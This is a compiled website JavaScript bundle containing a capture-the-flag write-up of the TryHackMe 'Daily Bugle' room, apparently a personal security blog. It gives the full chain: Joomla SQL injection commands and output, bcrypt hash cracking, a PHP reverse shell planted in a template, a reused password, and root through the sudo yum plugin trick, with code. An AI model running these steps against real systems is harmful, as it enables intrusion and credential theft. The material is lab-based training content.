"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[6057],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return d}});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,s=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),h=p(n),d=r,m=h["".concat(s,".").concat(d)]||h[d]||c[d]||o;return n?a.createElement(m,i(i({ref:t},u),{},{components:n})):a.createElement(m,i({ref:t},u))}));function d(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=h;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:r,i[1]=l;for(var p=2;p<o;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},8072:function(e,t,n){n.r(t),n.d(t,{assets:function(){return s},contentTitle:function(){return i},default:function(){return c},frontMatter:function(){return o},metadata:function(){return l},toc:function(){return p}});var a=n(3117),r=(n(7294),n(3905));const o={},i=void 0,l={unversionedId:"Cibersecurity/Red Team/Writeups/Daily Bugle THM{}",id:"Cibersecurity/Red Team/Writeups/Daily Bugle THM{}",title:"Daily Bugle THM{}",description:"Nmap",source:"@site/docs/Cibersecurity/Red Team/Writeups/Daily Bugle THM{}.md",sourceDirName:"Cibersecurity/Red Team/Writeups",slug:"/Cibersecurity/Red Team/Writeups/Daily Bugle THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Daily Bugle THM{}",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Corp THM{} Kerberoasting",permalink:"/docs/Cibersecurity/Red Team/Writeups/Corp THM{} Kerberoasting"},next:{title:"Game Zone THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Game Zone THM{}"}},s={},p=[{value:"Nmap",id:"nmap",level:3},{value:"Gobuster",id:"gobuster",level:3},{value:"Joomla",id:"joomla",level:3},{value:"Searchsploit and GitHub",id:"searchsploit-and-github",level:3},{value:"John",id:"john",level:3},{value:"Webpage",id:"webpage",level:3},{value:"Reverse Shell",id:"reverse-shell",level:3},{value:"Privilege escalation",id:"privilege-escalation",level:3}],u={toc:p};function c(e){let{components:t,...n}=e;return(0,r.kt)("wrapper",(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h3",{id:"nmap"},"Nmap"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"sudo nmap -A -sC -T4 10.10.208.57")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)\n|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)\n|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)\n80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)\n| http-robots.txt: 15 disallowed entries \n| /joomla/administrator/ /administrator/ /bin/ /cache/ \n| /cli/ /components/ /includes/ /installation/ /language/ \n|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/\n|_http-title: Home\n|_http-generator: Joomla! - Open Source Content Management\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40\n3306/tcp open  mysql   MariaDB (unauthorized)\n")),(0,r.kt)("h3",{id:"gobuster"},"Gobuster"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"gobuster dir -u http://10.10.208.57/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt ")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"/images               (Status: 301) [Size: 235] [--\x3e http://10.10.208.57/images/]\n/templates            (Status: 301) [Size: 238] [--\x3e http://10.10.208.57/templates/]\n/media                (Status: 301) [Size: 234] [--\x3e http://10.10.208.57/media/]    \n/modules              (Status: 301) [Size: 236] [--\x3e http://10.10.208.57/modules/]  \n/bin                  (Status: 301) [Size: 232] [--\x3e http://10.10.208.57/bin/]      \n/plugins              (Status: 301) [Size: 236] [--\x3e http://10.10.208.57/plugins/]  \n/includes             (Status: 301) [Size: 237] [--\x3e http://10.10.208.57/includes/] \n/language             (Status: 301) [Size: 237] [--\x3e http://10.10.208.57/language/] \n/components           (Status: 301) [Size: 239] [--\x3e http://10.10.208.57/components/]\n/cache                (Status: 301) [Size: 234] [--\x3e http://10.10.208.57/cache/]     \n/libraries            (Status: 301) [Size: 238] [--\x3e http://10.10.208.57/libraries/] \n/tmp                  (Status: 301) [Size: 232] [--\x3e http://10.10.208.57/tmp/]       \n/layouts              (Status: 301) [Size: 236] [--\x3e http://10.10.208.57/layouts/]   \n/administrator        (Status: 301) [Size: 242] [--\x3e http://10.10.208.57/administrator/]\n/cli                  (Status: 301) [Size: 232] [--\x3e http://10.10.208.57/cli/]\n")),(0,r.kt)("h3",{id:"joomla"},"Joomla"),(0,r.kt)("p",null,"Searching in Hacktricks, we find how to get a list of files and the version of Joomla"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"In /administrator/manifests/files/joomla.xml you could access a list of files inside the root folder, and version of Joomla.\nIn /language/en-GB/en-GB.xml you can get the version of Joomla.\n")),(0,r.kt)("h3",{id:"searchsploit-and-github"},"Searchsploit and GitHub"),(0,r.kt)("p",null,"With this tool, we can find an exploit for this version.\n",(0,r.kt)("inlineCode",{parentName:"p"},"searchsploit joomla 3.7.0")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Joomla! 3.7.0 - 'com_fields' SQL Injection         php/webapps/42033.txt\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"searchsploit -p 42033")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Exploit: Joomla! 3.7.0 - 'com_fields' SQL Injection\n      URL: https://www.exploit-db.com/exploits/42033\n     Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt\nFile Type: ASCII text, with CRLF line terminators\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"cp /usr/share/exploitdb/exploits/php/webapps/42033.txt .")),(0,r.kt)("p",null,"Now we open the exploit and find this line for sqlmap.\n",(0,r.kt)("inlineCode",{parentName:"p"},'sqlmap -u "http://10.10.192.240/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"available databases [5]:\n[*] information_schema\n[*] joomla\n[*] mysql\n[*] performance_schema\n[*] test\n\n[15:08:40] [WARNING] HTTP error codes detected during run:\n500 (Internal Server Error) - 1 times\n[15:08:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.192.240'\n[15:08:40] [WARNING] your sqlmap version is outdated\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"We obtain that, so we can't continue with sqlmap.\nLet's find anything else on GitHub searching `joomla 3.7.0`.\nWe find [joomblah.py](https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py) with the explanation of the vulnerability [HERE](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html)\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"python3 joomblah.py http://10.10.192.240")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[-] Fetching CSRF token\n [-] Testing SQLi\n  -  Found table: fb9j5_users\n  -  Extracting users from fb9j5_users\n [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']\n  -  Extracting sessions from fb9j5_session\n")),(0,r.kt)("h3",{id:"john"},"John"),(0,r.kt)("p",null,"Now we paste the hast to a file and use John to crack it\n",(0,r.kt)("inlineCode",{parentName:"p"},"john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Using default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nspiderman123     (?)\n1g 0:00:06:15 DONE (2022-03-22 15:31) 0.002660g/s 124.6p/s 124.6c/s 124.6C/s thelma1..speciala\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,r.kt)("h3",{id:"webpage"},"Webpage"),(0,r.kt)("p",null,"We go to \\<IP",">","/administrator and use ",(0,r.kt)("strong",{parentName:"p"},"jonah"),"  /  ",(0,r.kt)("strong",{parentName:"p"},"spiderman123"),".\nAfter enter to the administration panel, we identify that a php exploit can be upload and accessed."),(0,r.kt)("p",null,"After a little finding, we go to Templates and locate the index.php of beez3. Now we can change the php for the php-reverse-shell of pentestmonkey.\n",(0,r.kt)("a",{parentName:"p",href:"https://pentestmonkey.net/tools/web-shells/php-reverse-shell"},"PHP REVERSE SHELL"),". After that, we start a netcan listener:\n",(0,r.kt)("inlineCode",{parentName:"p"},"nc -lvnp 5555")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"listening on [any] 5555 ...\nconnect to [10.11.62.63] from (UNKNOWN) [10.10.6.7] 60746\nLinux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n 03:40:24 up 11 min,  0 users,  load average: 0.00, 0.04, 0.07\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=48(apache) gid=48(apache) groups=48(apache)\nsh: no job control in this shell\nsh-4.2$ \n")),(0,r.kt)("p",null,"And now we have a user shell."),(0,r.kt)("h3",{id:"reverse-shell"},"Reverse Shell"),(0,r.kt)("p",null,"Let's improve our shell following this guide ",(0,r.kt)("a",{parentName:"p",href:"https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/"},"UPGRADE SHELL"),".\nKnow we need to locate the flags. As we don't have permission to access to jjameson folder neither root folder, it's important to escalate privileges. For that let's use ",(0,r.kt)("strong",{parentName:"p"},"linpeash.sh")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Searching passwords in config PHP files\n        public $password = 'nv5uz9r3ZEDzVjNu';                                                                                                               \n                        $this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];\n                        $this->password = null;\n                        'password' => $this->password,\n")),(0,r.kt)("p",null,"And also we find this"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"-rwxr-xr-x. 1 apache apache 8378 Apr 25  2017 /var/www/html/libraries/joomla/cache/storage.php\n-rwxr-xr-x. 1 apache apache 4948 Apr 25  2017 /var/www/html/libraries/joomla/session/storage.php\n-rwxr-xr-x. 1 apache apache 1060 Apr 25  2017 /var/www/html/administrator/components/com_installer/controllers/database.php\n-rwxr-xr-x. 1 apache apache 7802 Apr 25  2017 /var/www/html/administrator/components/com_installer/models/database.php\n-rwxr-xr-x. 1 apache apache 5876 Apr 25  2017 /var/www/html/libraries/fof/database/database.php\n-rwxr-xr-x. 1 apache apache 5328 Apr 25  2017 /var/www/html/libraries/joomla/database/database.php\n-rwxr-xr-x. 1 apache apache 3934 Apr 25  2017 /var/www/html/libraries/joomla/log/logger/database.php\n-rwxr-xr-x. 1 apache apache 1455 Apr 25  2017 /var/www/html/libraries/joomla/model/database.php\n-rwxr-xr-x. 1 apache apache 3978 Apr 25  2017 /var/www/html/libraries/joomla/session/storage/database.php\n")),(0,r.kt)("p",null,"In the file ",(0,r.kt)("em",{parentName:"p"},"configuration.php"),", we find this password ",(0,r.kt)("em",{parentName:"p"},"nv5uz9r3ZEDzVjNu")," and we can use it with the user ",(0,r.kt)("em",{parentName:"p"},"jjameson"),"\nAnd the user flag is located there."),(0,r.kt)("h3",{id:"privilege-escalation"},"Privilege escalation"),(0,r.kt)("p",null,"We run as jjameson linpeas.sh another time and find this:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d\n\nUser jjameson may run the following commands on dailybugle:\n    (ALL) NOPASSWD: /usr/bin/yum\n")),(0,r.kt)("p",null,"So we go to ",(0,r.kt)("inlineCode",{parentName:"p"},"https://gtfobins.github.io/#yum"),"\nThere, we find this code to become root."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"sh-4.2# whoami\nroot\n")))}c.isMDXComponent=!0}}]);